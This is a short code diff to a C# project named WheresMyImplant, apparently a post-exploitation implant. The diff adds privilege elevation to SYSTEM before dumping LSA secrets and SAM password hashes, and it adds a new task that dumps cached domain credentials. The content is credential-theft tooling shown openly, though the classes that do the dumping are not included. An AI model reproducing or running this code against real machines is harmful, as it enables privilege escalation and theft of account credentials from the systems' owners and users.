@@ -405,19 +405,50 @@ namespace WheresMyImplant
         [ManagementTask]
         public static String DumpLsa()
         {
-            LSASecrets lsaSecrets = new LSASecrets();
-            if (!lsaSecrets.bailOut)
+            StringBuilder output = new StringBuilder();
+            CheckPrivileges checkSystem = new CheckPrivileges();
+            checkSystem.GetSystem();
+            output.Append(checkSystem.GetOutput());
+
+            if (!checkSystem.croak)
             {
+                LSASecrets lsaSecrets = new LSASecrets();
                 lsaSecrets.DumpLSASecrets();
+                output.Append(lsaSecrets.GetOutput());
             }
-            return lsaSecrets.GetOutput();
+            return output.ToString();
         }
 
         [ManagementTask]
         public static String DumpSAM()
         {
-            SAM sam = new SAM();
-            return sam.GetOutput();
+            StringBuilder output = new StringBuilder();
+            CheckPrivileges checkSystem = new CheckPrivileges();
+            checkSystem.GetSystem();
+            output.Append(checkSystem.GetOutput());
+
+            if (!checkSystem.croak)
+            {
+                SAM sam = new SAM();
+                output.Append(sam.GetOutput());
+            }
+            return output.ToString();
+        }
+
+        [ManagementTask]
+        public static String DumpDomainCache()
+        {
+            StringBuilder output = new StringBuilder();
+            CheckPrivileges checkSystem = new CheckPrivileges();
+            checkSystem.GetSystem();
+            output.Append(checkSystem.GetOutput());
+
+            if (!checkSystem.croak)
+            {
+                CacheDump cacheDump = new CacheDump();
+                output.Append(cacheDump.GetOutput());
+            }
+            return output.ToString();
         }
     }
 }
